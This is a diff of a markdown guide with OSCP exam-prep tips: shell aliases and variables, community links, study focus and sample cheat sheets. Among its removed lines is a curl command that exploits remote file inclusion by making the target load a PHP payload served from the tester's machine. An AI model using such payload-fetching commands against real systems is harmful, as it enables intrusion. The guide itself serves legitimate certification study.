@@ -4,8 +4,8 @@ I completed all five OSCP exam machines in 9.5 hours and I did not use Metasploi
 
 ## 1. Tame your terminal
 
-Export variables and set aliases in `~/.bashrc` for commands that you will frequently. I recommend the following: 
-* Store your OSCP lab and exam content on your host machine and share it with your PWK virtual machine using VMWare's shared folders feature. Use the following alias to conveniently mount the shared drives inside of the virtual machine: 
+Export variables in `~/.bashrc` and set aliases in `~/.bash_aliases` for commands that you will frequently use. I recommend the following: 
+* Store your OSCP lab and exam content on your host machine and share it with your Pentesting with Kali Linux (PWK) virtual machine using VMWare's shared folders. Your PWK virtual machine should come with a script to mount all shared drives, but here's a copy if it's missing:
 	```
 	alias "mount-shared-folders=
 	vmware-hgfsclient | while read folder; do
@@ -20,15 +20,10 @@ Export variables and set aliases in `~/.bashrc` for commands that you will frequ
 	export targ=x.x.x.x
 	export tun0=$(/sbin/ip -o -4 addr list tun0 | awk '{print $4}' | cut -d/ -f1)
 	```
-	After you've finished a machine and changed the `targ` variable, use `source` to reload `.bashrc` for the current session:
+	Use `source` to reload `.bashrc` if you've changed a variable's definition and you don't want to have to close your terminal:
 	```
 	source ~/.bashrc
-	```
-	Example: use these variables to exploit an RFI vulnerability (the unicorns of web application hacking):
-	```
-	curl "http://$targ/vuln_page.php?file=http://$tun0:8888/payload.php"
-	```
-		
+	```	
 * Not OSCP-specific but you can use `xclip` and an alias to copy and paste while keeping both hands on the keyboard:
 	```
 	alias "c=xclip -selection clipboard"
@@ -46,7 +41,7 @@ Export variables and set aliases in `~/.bashrc` for commands that you will frequ
 		python3 -m http.server 8888 --directory $webserver_dir --bind $tun0"
 	```
 ## 2. Connect with the OSCP community
-There are a handful of Discord servers with OSCP text channels and one of them is InfoSec Prep which has ~17,000 members as of 1/1/2020: https://discord.gg/mS5tzTuyR2.
+There are a handful of Discord servers with OSCP text channels and one of them is InfoSec Prep which has ~16,000 members as of 1/1/2020: https://discord.gg/mS5tzTuyR2.
 
 ## 3. Study for the *exam*
 While completing the PWK exercises and labs you will learn essential offensive security concepts like post-exploitation and lateral movement which will not be tested during the OSCP exam. Additionally, in 2020 Offensive Security updated the course (https://www.offensive-security.com/offsec/pwk-2020-update/) to incude a lot of new content including Active Directory and Powershell Empire modules which will also not be tested during the OSCP exam according to the update announcement: "At this time, the OSCP exam, proctoring, and certification procedures will remain the same." You could ignore these essential concepts (at a detriment to your professional development) if your only goal is to pass the OSCP exam. 
@@ -56,7 +51,7 @@ Every J. Random Hacker has published an OSCP cheat sheet:
 
 ![Google cheat sheet result count](google_cheat_sheet_count.png)
 
-and their work is helpful to you but not nearly as helpful as creating your own. I recommend that you create at least 3 documents as you progress through the PWK exercises and lab machines. The following are snippets from the three cheat sheets that I created:
+and their work is helpful to you but not nearly as helpful as creating your own. I recommend that you create at least 3 cheat sheet documents as you progress through the PWK exercises and lab machines. The following are snippets from three that I created-
 
 1. An enumeration cheat sheet:
 
@@ -163,4 +158,4 @@ GENERAL PRIV ESC
 	* review user's powershell history
 ...
 ```
-Good luck!
+Bona sort!
